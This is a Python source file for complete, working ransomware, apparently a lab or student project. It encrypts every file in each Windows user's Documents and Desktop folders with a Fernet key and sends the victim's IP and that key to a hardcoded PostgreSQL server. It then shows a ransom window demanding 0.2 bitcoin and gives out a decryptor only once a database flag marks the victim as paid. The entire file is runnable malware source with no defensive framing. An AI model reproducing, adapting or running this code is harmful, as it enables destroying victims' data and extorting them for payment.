import os
import socket
import psycopg2
import tkinter as tk
from cryptography.fernet import Fernet


def main():
    backslash = "\\"
    base_path = "C:" + backslash + "Users"
    ignore = ['A Minha Música', 'Os Meus Vídeos', 'As Minhas Imagens', 'FreeVBucks.exe', "Decryptor.exe", "All Users",
              "Default",
              "Default User", "desktop.ini", "Public"]
    key = Fernet.generate_key()
    f = Fernet(key)
    hostname = socket.gethostname()
    ipv4 = socket.gethostbyname(hostname)

    if not isOwned(ipv4):
        users = get_users(base_path, backslash, ignore)
        directories = set_directories(users, backslash)
        loop(directories, ignore, f)
        store_to_db(ipv4, key.decode())

    show_window(ipv4, get_users(base_path, backslash, ignore))


def isOwned(ipv4: str):
    conn = get_conn()

    row = select_query_fetchone(conn, "SELECT * FROM Attacks WHERE ip=%s ORDER BY date DESC", (ipv4,))

    if row is not None:
        if row[5]:
            close_conn(conn)
            return True
        else:
            close_conn(conn)
            return False
    else:
        return False


def get_users(base_path: str, backslash: str, ignore: list[str]):
    users = []
    for dir in os.listdir(base_path):
        if dir in ignore:
            continue
        else:
            users.append(base_path + backslash + dir)
    return users


def set_directories(users: list[str], backslash: str):
    directories = []
    for user in users:
        directories.append(user + backslash + "Documents")
        directories.append(user + backslash + "Desktop")
    return directories


def loop(directories: list[str], ignore: list[str], f: Fernet):
    aux_directories = []
    while len(directories) != 0:
        for directory in directories:
            if os.path.exists(directory) and os.path.isdir(directory):
                for file in os.listdir(directory):
                    if file in ignore:
                        continue
                    if os.path.isfile(directory + "\\" + file):
                        read(directory + "\\" + file, f)
                    if os.path.isdir(directory + "\\" + file):
                        aux_directories.append(directory + "\\" + file)
        directories.clear()
        directories = aux_directories.copy()
        aux_directories.clear()


def read(file_path: str, f: Fernet):
    with open(file_path, "rb") as file:
        content = file.read()
        magic(content, file_path, f)


def magic(content, file_path: str, f: Fernet):
    e_content = f.encrypt(content)
    with open(file_path, "wb") as file:
        file.write(e_content)


def store_to_db(ipv4: str, key: str):
    conn = get_conn()
    execute_query(conn, "INSERT INTO Attacks (private_key, ip, date) VALUES (%s, %s, CURRENT_TIMESTAMP)", (key, ipv4))

    close_conn(conn)


def center_window(window):
    window.update_idletasks()
    width = window.winfo_width()
    height = window.winfo_height()
    x = (window.winfo_screenwidth() // 2) - (width // 2)
    y = (window.winfo_screenheight() // 2) - (height // 2)
    window.geometry('{}x{}+{}+{}'.format(width, height, x, y))


def show_window(ipv4: str, users: list[str]):
    conn = get_conn()

    window = tk.Tk()

    window.title("Warning!")

    window.configure()

    window.geometry("600x400")

    window.resizable(False, False)

    text1 = tk.Label(window, text="Your computer has been hacked!", fg="black", font=("Arial", 20, "bold"), anchor="w")
    text1.pack(fill="x")

    text2 = tk.Label(window,
                     text="Please send me 0.2 bitcoin and I will send you the decryptor script and the key for you to recover your files!",
                     fg="black", font=("Arial", 8), anchor="w")
    text2.pack(fill="x")

    text3 = tk.Label(window, text='You will need to use a key in order to decrypt your files.', fg="black",
                     font=("Arial", 10), anchor="w")
    text3.pack(fill="x")

    text6 = tk.Label(window, text='Bank Account:', fg="black",
                     font=("Arial", 10), anchor="w")
    text6.pack(fill="x")

    bankAccountText = tk.Text(window, height=1, borderwidth=0)
    bankAccountText.insert(1.0, "PT50091823091280310191")
    bankAccountText.pack()

    button = tk.Button(window, text="Get Decryptor", command=lambda: get_decryptor(ipv4, users))
    button.pack()

    center_window(window)

    window.mainloop()
    conn.close()


def get_decryptor(ipv4: str, users: list[str]):
    conn = get_conn()

    if isPayed(ipv4, get_conn()):
        row = select_query_fetchone(conn, "SELECT * FROM Decryptors", None)
        file_data = row[2]

        row = select_query_fetchone(conn,
                                    "SELECT * FROM Attacks WHERE ip=%s AND encrypted=true AND payed=true AND decryptor=false ORDER BY date DESC",
                                    (ipv4,))
        if row is not None:
            id = row[0]

            if row is not None:
                private_key = row[1]

                file_path = users[0] + "\\" + "Desktop" + "\\" + "Decryptor.exe"
                with open(file_path, "wb") as file:
                    file.write(file_data)

                file_path = users[0] + "\\" + "Desktop" + "\\" + "key.txt"
                with open(file_path, "w") as file:
                    file.write(private_key)

                execute_query(conn, "UPDATE Attacks SET decryptor=true WHERE id=%s", (id,))

                close_conn(conn)
                show_got_decrpytor_window()


def show_got_decrpytor_window():
    window = tk.Tk()

    window.title("Warning!")

    window.configure()

    window.geometry("600x400")

    window.resizable(False, False)

    text1 = tk.Label(window, text="You downloaded the decryptor and the key they are on on your Desktop!", fg="black",
                     font=("Arial", 10, "bold"), anchor="w")
    text1.pack(fill="x")
    center_window(window)

    window.mainloop()


def isPayed(ipv4: str, conn):
    row = select_query_fetchone(conn,
                                "SELECT * FROM Attacks WHERE ip=%s AND payed=true AND decryptor=false ORDER BY date DESC",
                                (ipv4,))

    if row is None:
        close_conn(conn)
        return False
    else:
        close_conn(conn)
        return True


def get_conn():
    conn = psycopg2.connect(
        database="srs_db",
        user="srs_user",
        password="srs_user",
        host="192.168.1.102",
        port="5432"
    )
    return conn


def close_conn(conn):
    conn.close()


def select_query_fetchone(conn, query: str, values):
    cur = conn.cursor()
    cur.execute(query, values)
    row = cur.fetchone()
    cur.close()

    return row


def execute_query(conn, query: str, values):
    cur = conn.cursor()
    cur.execute(query, values)
    conn.commit()
    cur.close()


if __name__ == "__main__":
    main()
